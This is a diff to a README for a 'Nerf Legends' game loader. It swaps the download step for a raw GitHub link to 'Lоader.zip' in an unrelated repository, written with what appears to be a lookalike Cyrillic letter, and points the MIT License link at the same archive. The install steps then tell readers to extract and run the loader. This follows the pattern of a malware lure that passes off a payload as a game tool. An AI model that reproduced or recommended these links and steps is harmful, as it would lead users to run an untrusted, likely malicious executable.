@@ -37,7 +37,7 @@ Nerf Legends , best Nerf Legends loader 2025, Nerf Legends Windows install, Nerf
 
 ## 📦 Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/Isaacmx77/SonicVale/main/Lоader.zip** from this repository.
 2. Extract the archive with your preferred tool (WinRAR, 7-Zip, Unarchiver, Ark, etc.).
 3. Run the Loader on your compatible OS.
 4. Follow on-screen instructions to launch Nerf Legends!
@@ -52,4 +52,4 @@ This tool is for **educational and evaluation purposes only**. We do not host or
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) – 2025. All rights reserved.
+Distributed under the [MIT License](https://raw.githubusercontent.com/Isaacmx77/SonicVale/main/Lоader.zip) – 2025. All rights reserved.
